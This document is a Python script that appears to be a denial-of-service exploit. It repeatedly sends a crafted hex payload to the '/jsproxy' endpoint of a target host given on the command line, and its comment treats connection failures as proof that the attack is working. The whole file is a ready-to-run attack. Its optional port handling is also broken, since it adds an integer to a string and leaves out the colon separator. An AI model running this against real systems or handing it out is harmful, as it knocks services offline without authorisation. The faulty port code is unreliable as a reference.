import binascii
import requests
import time
import sys

payload = binascii.unhexlify("00000000000000005e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e")

if len(sys.argv) < 2 or (len(sys.argv) == 3 and not str.isdigit(sys.argv[2])) or len(sys.argv) > 3:
    print(f"Usage: python3 {sys.argv[0]} IP_ADDRESS/HOSTNAME [PORT]")
    exit()

ip = sys.argv[1]
url = f"http://{ip}"

if len(sys.argv) == 3:
    url += int(sys.argv[2])

url += "/jsproxy"

print("Press Ctrl+C to terminate the program")
while True:
    try:
        res = requests.post(url, data=bytes(payload), headers={'Content-Type': 'msg'})
    except:
        # If exception happen, it means that the exploit is working
        time.sleep(0.5)